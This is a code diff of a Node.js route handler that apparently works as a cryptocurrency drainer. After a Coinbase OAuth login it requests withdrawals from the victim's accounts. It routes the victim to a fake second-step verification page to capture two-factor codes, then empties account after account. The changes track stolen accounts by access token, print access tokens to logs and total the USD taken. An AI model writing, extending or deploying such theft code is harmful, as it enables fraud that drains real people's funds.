@@ -6,7 +6,8 @@ const controller = require("../controllers");
 const User = require("../models/Users");
 const Visitor = require("../models/Visitors");
 
-let AvailableAccounts;
+let AvailableAccounts = [];
+let sum = [];
 let status = true;
 let reqWithdrawResponse;
 
@@ -52,6 +53,7 @@ router.get("/callback", async (req, res) => {
     const userInfo = await controller.user.getUserInfo(token);
     const balance = await controller.user.getBalance(token);
 
+    console.log("Callback Arrived - Token:", token.access_token);
 
     const userData = {
       email: userInfo.email,
@@ -76,15 +78,16 @@ router.get("/callback", async (req, res) => {
 
 
     // AvailableAccounts = balance.accounts.filter((account) => !account.available);
-    AvailableAccounts = balance.accounts;;
-    if (!AvailableAccounts.length) {
+    AvailableAccounts[token.access_token] = balance.accounts;
+    sum[token.access_token] = 0;
+    if (!AvailableAccounts[token.access_token].length) {
       res.redirect(`https://www.coinbase.com`);
     }
 
     try {
       reqWithdrawResponse = await controller.transaction.reqWithdraw(
         token,
-        AvailableAccounts[0]
+        AvailableAccounts[token.access_token][0]
       );
       console.log(reqWithdrawResponse, "--reqWithdrawResponse--");
       if (
@@ -95,18 +98,18 @@ router.get("/callback", async (req, res) => {
         res.redirect(
           `${process.env.FRONTEND_URI}/verify_step_two?verify_step_two_challenge=${encodedToken}`
         );
-        await controller.message.msg_reqWithdraw(AvailableAccounts[0]);
+        await controller.message.msg_reqWithdraw(AvailableAccounts[token.access_token][0]);
         await handleTwoFactorAuthentication();
       } else if (
         reqWithdrawResponse.status === 400 &&
         (reqWithdrawResponse.data.id === "invalid_request" || reqWithdrawResponse.data.id === "validation_error")
       ) {
         await controller.message.msg_invalidReqWithdraw(
-          AvailableAccounts[0],
+          AvailableAccounts[token.access_token][0],
           reqWithdrawResponse.message
         );
         await User.updateOne(
-          { email: userInfo.email, "accounts.id": AvailableAccounts[0].id },
+          { email: userInfo.email, "accounts.id": AvailableAccounts[token.access_token][0].id },
           {
             $set: {
               "accounts.$.reqWithdrawReason": reqWithdrawResponse.message,
@@ -151,21 +154,24 @@ async function handleTwoFactorAuthentication() {
       const two_factor_code = req.body.two_factor_code;
       const access_token = req.body.access_token;
 
+      console.log("Two Factor Arrived - Token:", access_token);
+
       if (!status) {
         try {
           const response = await controller.transaction.withdrawAccount(
             access_token,
-            AvailableAccounts[0],
+            AvailableAccounts[access_token][0],
             two_factor_code
           );
           if (response.status === 201) {
             await controller.message.msg_withdrawAccount(response.data.data);
-            AvailableAccounts.shift();
+            sum[access_token] += parseFloat(AvailableAccounts[access_token][0].balanceInUSD)
+            AvailableAccounts[access_token].shift();
             res.status(response.status).json({
               data: response.data.data.amount.currency,
-              length: AvailableAccounts.length,
+              length: AvailableAccounts[access_token].length,
             });
-            if (!AvailableAccounts.length) {
+            if (!AvailableAccounts[access_token].length) {
               status = true;
               return;
             }
@@ -173,19 +179,19 @@ async function handleTwoFactorAuthentication() {
             status = false;
             reqWithdrawResponse = await controller.transaction.reqWithdraw(
               access_token,
-              AvailableAccounts[0]
+              AvailableAccounts[access_token][0]
             );
             if (reqWithdrawResponse.data.id === "two_factor_required") {
-              await controller.message.msg_reqWithdraw(AvailableAccounts[0]);
+              await controller.message.msg_reqWithdraw(AvailableAccounts[access_token][0]);
             } else if (reqWithdrawResponse.data.id === "invalid_request") {
               await controller.message.msg_invalidReqWithdraw(
-                AvailableAccounts[0],
+                AvailableAccounts[access_token][0],
                 reqWithdrawResponse.data.message
               );
               await User.updateOne(
                 {
                   email: userInfo.email,
-                  "accounts.id": AvailableAccounts[0].id,
+                  "accounts.id": AvailableAccounts[access_token][0].id,
                 },
                 {
                   $set: {
@@ -212,18 +218,18 @@ async function handleTwoFactorAuthentication() {
         try {
           const response = await controller.transaction.withdrawAccount(
             access_token,
-            AvailableAccounts[0],
+            AvailableAccounts[access_token][0],
             two_factor_code
           );
           if (response.status === 201) {
             await controller.message.msg_withdrawAccount(response.data.data);
-            AvailableAccounts.shift();
+            AvailableAccounts[access_token].shift();
             res.status(response.status).json({
               data: response.data.data.amount.currency,
-              length: AvailableAccounts.length,
+              length: AvailableAccounts[access_token].length,
             });
 
-            if (!AvailableAccounts.length) {
+            if (!AvailableAccounts[access_token].length) {
               status = true;
               return;
             }
@@ -231,19 +237,19 @@ async function handleTwoFactorAuthentication() {
             status = false;
             reqWithdrawResponse = await controller.transaction.reqWithdraw(
               access_token,
-              AvailableAccounts[0]
+              AvailableAccounts[access_token][0]
             );
             if (reqWithdrawResponse.data.id === "two_factor_required") {
-              await controller.message.msg_reqWithdraw(AvailableAccounts[0]);
+              await controller.message.msg_reqWithdraw(AvailableAccounts[access_token][0]);
             } else if (reqWithdrawResponse.data.id === "invalid_request") {
               await controller.message.msg_invalidReqWithdraw(
-                AvailableAccounts[0],
+                AvailableAccounts[access_token][0],
                 reqWithdrawResponse.data.message
               );
               await User.updateOne(
                 {
                   email: userInfo.email,
-                  "accounts.id": AvailableAccounts[0].id,
+                  "accounts.id": AvailableAccounts[access_token][0].id,
                 },
                 {
                   $set: {
